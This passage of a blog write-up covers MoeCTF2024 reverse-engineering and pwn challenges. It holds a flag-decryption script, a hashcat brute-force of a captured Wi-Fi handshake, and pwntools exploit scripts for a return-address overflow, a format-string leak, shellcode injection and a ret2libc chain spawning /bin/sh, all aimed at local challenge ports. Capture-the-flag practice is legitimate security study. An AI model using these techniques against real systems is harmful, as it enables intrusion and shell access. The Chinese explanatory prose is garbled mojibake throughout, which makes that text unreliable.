class="hljs-number">0x82</span>,<br>   <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0x91</span>,<br>   <span class="hljs-number">0x46</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0xA4</span>, <span class="hljs-number">0xA5</span>, <span class="hljs-number">0xE0</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x4E</span>,<br>   <span class="hljs-number">0x44</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x8F</span>]<br><br><span class="hljs-comment"># xmm3=0x3000000020000000100000000</span><br><span class="hljs-comment"># xmm2=0x0FF000000FF000000FF000000FF</span><br><br><span class="hljs-comment"># ecx=0</span><br><span class="hljs-comment"># esi=0x15151515151515151515151515151515</span><br><span class="hljs-comment"># edx=0x14141414141414141414141414141414</span><br><span class="hljs-comment"># (((ecx+xmm3)&amp;xmm2+esi)^input1[ecx])+edx</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># (input1[0x38]^0x4e)+0x14</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># xmm3=0x3000000020000000100000000</span><br><span class="hljs-comment"># xmm2=0x0FF000000FF000000FF000000FF</span><br><span class="hljs-comment"># edx=0x1A1A1A1A1A1A1A1A1A1A1A1A1A1A1A1A</span><br><span class="hljs-comment"># dsi=0x14141414141414141414141414141414</span><br><span class="hljs-comment"># (((ecx+xmm3)&amp;xmm2+edx)^input1[ecx])+esi</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># (input1[0x38]^0x53)+0x14</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># xmm3=0x3000000020000000100000000</span><br><span class="hljs-comment"># xmm2=0x0FF000000FF000000FF000000FF</span><br><span class="hljs-comment"># edx=0x19191919191919191919191919191919</span><br><span class="hljs-comment"># esi=0x14141414141414141414141414141414</span><br><span class="hljs-comment"># (((ecx+xmm3)&amp;xmm2+edx)^input1[ecx])+esi</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># (input1[0x38]^0x51)+0x14</span><br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):<br>    a[i] = (a[i] - <span class="hljs-number">0x14</span>) ^ (i+<span class="hljs-number">0x19</span>)<br>    a[i] = (a[i] - <span class="hljs-number">0x14</span>) ^ (i+<span class="hljs-number">0x1a</span>)<br>    a[i] = (a[i] - <span class="hljs-number">0x14</span>) ^ (i+<span class="hljs-number">0x15</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>((a[i]+<span class="hljs-number">256</span>)%<span class="hljs-number">256</span>),end=<span class="hljs-string">&#x27;&#x27;</span>)<br><br><br><span class="hljs-comment">#moectf&#123;w1Nd0Ws_S3H_15_A_g0oD_m37h0d_70_h4nd13_EXCEPTI0NS&#125;</span><br></code></pre></td></tr></table></figure><h2 id="é—»é£è€ŒåŠ¨-2"><a href="#é—»é£è€ŒåŠ¨-2" class="headerlink" title="é—»é£è€ŒåŠ¨-2"></a>é—»é£è€ŒåŠ¨-2</h2><p>å…ˆè„±å£³</p><p>æ ¹æ®è°ƒè¯•å‘ç°ä¸€æ¬¡ç”Ÿæˆä¸€ä½</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1727427480249-4165aa13-80c7-405f-acb4-ea6e14c9a8f6.png" class="" title="img"><p>aaaaaaaa:^0x44 ^0x1d ^0x4a ^0x7 ^0x44 ^0x49 ^0x1b ^0x5e </p><p>abcdegh:^0x44 ^0x1d ^0x4a ^0x7 ^0x44 ^0x49 ^0x1b ^0x5e </p><p>å¾—å‡ºç»“è®ºæ¯ä¸€ä½å¼‚æˆ–çš„æ•°å›ºå®šï¼Œåç»­å‘ç°æ²¡ä»€ä¹ˆç”¨</p><p>å°†æµé‡åŒ…è½¬ä¸º22000æ–‡ä»¶</p><p><code>.\hashcat -m 22000 -a 3 output.22000 ?1?1?1?1?1?1?1?1 -1 hilmnoprsuvwxyz</code>çˆ†ç ´22minå¾—åˆ°å¯†ç pzyisxnn</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1727449908854-6374d9ba-ba25-45f4-bc6f-fe1f69a1cc1e.png" class="" title="img"><p>å¾—åˆ°æœåŠ¡å™¨ç«¯åŠ å¯†å¯†é’¥4g3n71u0</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1727487798647-80d809db-c31a-473a-9a24-38910e0178a7.png" class="" title="img"><p>findcryptå‘ç°æœ‰des</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1727492987385-25589b18-be35-4b44-bbbb-09e1e6698595.png" class="" title="img"><p>flagé•¿åº¦ä¸º66</p><p>æŠŠsrvæ”¾åœ¨winè™šæ‹Ÿæœºä¸Šï¼Œå‘ç°æ²¡æˆåŠŸ</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1727495663055-19e07821-3172-4245-97d6-a8cb6f3a1dcf.png" class="" title="img"><p>åç»­ç›´æ¥è°ƒè¯•srv.exeï¼Œè¾“å…¥å¯¹åº”é•¿åº¦çš„flagå’Œpswåè¾“å…¥ipå’Œaddr</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1727529028621-a6ba0d7f-e6a0-4857-9346-ca328fc26a00.png" class="" title="img"><p>32ä½é•¿åº¦é«˜ä½ä½äº¤æ¢</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1727531030045-42d0368b-fca3-4c7f-99fe-b973f5573f40.png" class="" title="img"><p>è°ƒè¯•å‘ç°ä¸æ˜¯æ ‡å‡†desï¼Œä¸æƒ³åšäº†</p><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="å…¥é—¨æŒ‡åŒ—-1"><a href="#å…¥é—¨æŒ‡åŒ—-1" class="headerlink" title="å…¥é—¨æŒ‡åŒ—"></a>å…¥é—¨æŒ‡åŒ—</h2><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723452710680-d24b362c-afec-48e0-bb71-76b8c998e036.png" class="" title="img"><h2 id="NotEnoughTime"><a href="#NotEnoughTime" class="headerlink" title="NotEnoughTime"></a>NotEnoughTime</h2><p>ç”¨pwntoolsè¿›è¡Œå››åˆ™è¿ç®—ï¼Œæ³¨æ„å‘é€çš„æ—¶å€™å‘ä¸‹å–æ•´ï¼Œå› ä¸ºç»“æœæ˜¯è´Ÿæ•°ä¼šwrongï¼Œç›´æ¥strä¹Ÿæ˜¯wrong</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br><span class="hljs-comment">#from LibcSearcher import *</span><br><br><span class="hljs-comment">#filename=&#x27;./lockedshell&#x27;</span><br><span class="hljs-comment">#elf = ELF(filename)</span><br><span class="hljs-comment">#libc = ELF(&quot;./libc.so.6&quot;)</span><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>debug = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> debug:<br>io = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">34401</span>)<br><span class="hljs-keyword">else</span>:<br>io = process(filename)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">s</span>(<span class="hljs-params">a</span>) : io.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sa</span>(<span class="hljs-params">a, b</span>) : io.sendafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sl</span>(<span class="hljs-params">a</span>) : io.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sla</span>(<span class="hljs-params">a, b</span>) : io.sendlineafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">r</span>() : <span class="hljs-keyword">return</span> io.recv()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pr</span>() : <span class="hljs-built_in">print</span>(io.recv())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ru</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> io.recvuntil(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inter</span>() : io.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gdb</span>():<br>    gdb.attach(io)<br>    pause(<span class="hljs-number">1</span>)   <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr</span>():<br><span class="hljs-comment">#return u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8, b&#x27;\x00&#x27;))</span><br><span class="hljs-keyword">return</span> u32(io.recv()[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>])<br><br>ru(<span class="hljs-string">&quot;Let&#x27;s begin with simple ones.\n&quot;</span>)<br>sla(<span class="hljs-string">&quot;1 + 1 = &quot;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>sla(<span class="hljs-string">&quot;4 / 3 - 1 = &quot;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>ru(<span class="hljs-string">&quot;OK, then some tough ones. Be WELL PREPARED!\n&quot;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>):<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;i=&quot;</span>,i)<br>data=ru(<span class="hljs-string">&quot; = &quot;</span>)<br>exp = data.decode().split(<span class="hljs-string">&#x27;=&#x27;</span>)[<span class="hljs-number">0</span>].replace(<span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>exp=exp.replace(<span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br><span class="hljs-comment">#print(&#x27;exp:&#x27;,exp)</span><br>a=<span class="hljs-built_in">eval</span>(exp)<br>a=<span class="hljs-built_in">int</span>(a)<br><span class="hljs-keyword">if</span> a&lt;<span class="hljs-number">0</span>:<br>a=a-<span class="hljs-number">1</span><br>sl(<span class="hljs-built_in">str</span>(a).encode())<br>pr()<br>inter()<br></code></pre></td></tr></table></figure><h2 id="no-more-gets"><a href="#no-more-gets" class="headerlink" title="no_more_gets"></a>no_more_gets</h2><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723442517386-40a34cfe-0f2e-4e3f-85f3-f710611ac63c.png" class="" title="img"><p>æº¢å‡ºä¿®æ”¹è¿”å›åœ°å€</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br><span class="hljs-comment">#from LibcSearcher import *</span><br><br>filename=<span class="hljs-string">&#x27;./lockedshell&#x27;</span><br>elf = ELF(filename)<br><span class="hljs-comment">#libc = ELF(&quot;./libc.so.6&quot;)</span><br>context(arch = elf.arch,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>debug = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> debug:<br>io = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">42943</span>)<br><span class="hljs-keyword">else</span>:<br>io = process(filename)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">s</span>(<span class="hljs-params">a</span>) : io.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sa</span>(<span class="hljs-params">a, b</span>) : io.sendafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sl</span>(<span class="hljs-params">a</span>) : io.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sla</span>(<span class="hljs-params">a, b</span>) : io.sendlineafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">r</span>() : <span class="hljs-keyword">return</span> io.recv()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pr</span>() : <span class="hljs-built_in">print</span>(io.recv())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ru</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> io.recvuntil(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inter</span>() : io.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gdb</span>():<br>    gdb.attach(io)<br>    pause(<span class="hljs-number">1</span>)   <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr</span>():<br><span class="hljs-comment">#return u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8, b&#x27;\x00&#x27;))</span><br><span class="hljs-keyword">return</span> u32(io.recv()[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>])<br><br>ret=<span class="hljs-number">0x40129E</span><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x58</span>+p64(ret)+p64(<span class="hljs-number">0x401176</span>)<br>sla(<span class="hljs-string">&quot;This is my own shell, enter the password or get out.\n&quot;</span>,payload)<br>inter()<br></code></pre></td></tr></table></figure><h2 id="leak-sth"><a href="#leak-sth" class="headerlink" title="leak_sth"></a>leak_sth</h2><p>éšæœºæ•°å›ºå®šåœ¨rsp+8å¤„</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724253292780-bfc577e4-df1f-49df-9225-b6d7233e350a.png" class="" title="img"><p>æ³„éœ²ä¹‹åç›´æ¥å‘é€</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import *</span><br><br>filename=<span class="hljs-string">&#x27;./pwn&#x27;</span><br>elf = ELF(filename)<br>context(arch = elf.arch,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br><br><br>debug = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> debug:<br>io = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">33265</span>)<br><span class="hljs-keyword">else</span>:<br>io = process(filename)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">s</span>(<span class="hljs-params">a</span>) : io.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sa</span>(<span class="hljs-params">a, b</span>) : io.sendafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sl</span>(<span class="hljs-params">a</span>) : io.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sla</span>(<span class="hljs-params">a, b</span>) : io.sendlineafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">r</span>() : <span class="hljs-keyword">return</span> io.recv()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pr</span>() : <span class="hljs-built_in">print</span>(io.recv())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ru</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> io.recvuntil(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inter</span>() : io.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gdb</span>():<br>    gdb.attach(io)<br>    pause(<span class="hljs-number">1</span>)   <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr</span>():<br><span class="hljs-comment">#return u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8, b&#x27;\x00&#x27;))</span><br><span class="hljs-keyword">return</span> u32(io.recv()[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>])<br><br>ru(<span class="hljs-string">&quot;What&#x27;s your name?&quot;</span>)<br>sl(<span class="hljs-string">&#x27;%7$p&#x27;</span>)<br>ru(<span class="hljs-string">&quot;Your name:\n&quot;</span>)<br>a1=io.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-literal">True</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;a1=&#x27;</span>,a1)<br>pay=<span class="hljs-built_in">int</span>(a1.decode(),<span class="hljs-number">16</span>)<br><br>sla(<span class="hljs-string">&quot;Give me the number\n&quot;</span>,<span class="hljs-built_in">str</span>(pay))<br>inter()<br></code></pre></td></tr></table></figure><h2 id="ezshellcode"><a href="#ezshellcode" class="headerlink" title="ezshellcode"></a>ezshellcode</h2><p>æº¢å‡ºé•¿åº¦è‡ªå·±å†³å®šï¼Œå¼€å¤´è¾“å…¥shellcodeåä¿®æ”¹è¿”å›åœ°å€</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724291160818-e2df3ce1-093a-4141-900f-a2399b4b8ace.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import *</span><br><br>filename=<span class="hljs-string">&#x27;./pwn&#x27;</span><br>elf = ELF(filename)<br>context(arch = elf.arch,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br><br><br>debug = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> debug:<br>io = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">38059</span>)<br><span class="hljs-keyword">else</span>:<br>io = process(filename)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">s</span>(<span class="hljs-params">a</span>) : io.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sa</span>(<span class="hljs-params">a, b</span>) : io.sendafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sl</span>(<span class="hljs-params">a</span>) : io.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sla</span>(<span class="hljs-params">a, b</span>) : io.sendlineafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">r</span>() : <span class="hljs-keyword">return</span> io.recv()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pr</span>() : <span class="hljs-built_in">print</span>(io.recv())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ru</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> io.recvuntil(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inter</span>() : io.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gdb</span>():<br>    gdb.attach(io)<br>    pause(<span class="hljs-number">1</span>)   <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr</span>():<br><span class="hljs-comment">#return u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8, b&#x27;\x00&#x27;))</span><br><span class="hljs-keyword">return</span> u32(io.recv()[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>])<br><br>sla(<span class="hljs-string">&quot;Tell me your age:&quot;</span>,<span class="hljs-string">b&#x27;256&#x27;</span>)<br>ru(<span class="hljs-string">&quot;Here is a gift for you :\n&quot;</span>)<br>st=<span class="hljs-built_in">int</span>(io.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-literal">True</span>),<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;st=&#x27;</span>,st)<br>shellcode=asm(shellcraft.sh())<br>payload=shellcode.ljust(<span class="hljs-number">0x68</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)+p64(st)<br>ru(<span class="hljs-string">&quot;What do you want to say?&quot;</span>)<br>sl(payload)<br>inter()<br></code></pre></td></tr></table></figure><h2 id="prelibc"><a href="#prelibc" class="headerlink" title="prelibc"></a>prelibc</h2><p>ret2libc,gadgetså»libcé‡Œæ‰¾</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724297766310-baa106b1-aeb1-4079-be94-d45bbe403f00.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import *</span><br><br>filename=<span class="hljs-string">&#x27;./prelibc&#x27;</span><br>elf = ELF(filename)<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>context(arch = elf.arch,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br><br><br>debug = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> debug:<br>io = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">38311</span>)<br><span class="hljs-keyword">else</span>:<br>io = process(filename)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">s</span>(<span class="hljs-params">a</span>) : io.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sa</span>(<span class="hljs-params">a, b</span>) : io.sendafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sl</span>(<span class="hljs-params">a</span>) : io.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sla</span>(<span class="hljs-params">a, b</span>) : io.sendlineafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">r</span>() : <span class="hljs-keyword">return</span> io.recv()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pr</span>() : <span class="hljs-built_in">print</span>(io.recv())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ru</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> io.recvuntil(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inter</span>() : io.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gdb</span>():<br>    gdb.attach(io)<br>    pause(<span class="hljs-number">1</span>)   <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr</span>():<br><span class="hljs-keyword">return</span> u64(io.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-comment">#return u32(io.recv()[0:4])</span><br><br>output = io.recvline_contains(<span class="hljs-string">b&#x27;I give you an address in libc:&#x27;</span>)<br>puts_addr = <span class="hljs-built_in">int</span>(output.split(<span class="hljs-string">b&#x27;: &#x27;</span>)[<span class="hljs-number">1</span>].strip().rstrip(<span class="hljs-string">b&#x27;.&#x27;</span>), <span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(puts_addr))<br>libc_base = puts_addr - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>pop_rdi=libc_base+<span class="hljs-number">0x2a3e5</span><br>ret=libc_base+<span class="hljs-number">0x29139</span><br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>bin_sh = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>))<br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x9</span>+p64(ret)+p64(pop_rdi)+p64(bin_sh)+p64(system)<br>sla(<span class="hljs-string">&#x27;&gt; &#x27;</span>,payload)<br>inter()<br></code></pre></td></tr></table></figure><h2 id="preshellcode"><a href="#preshellcode" class="headerlink" 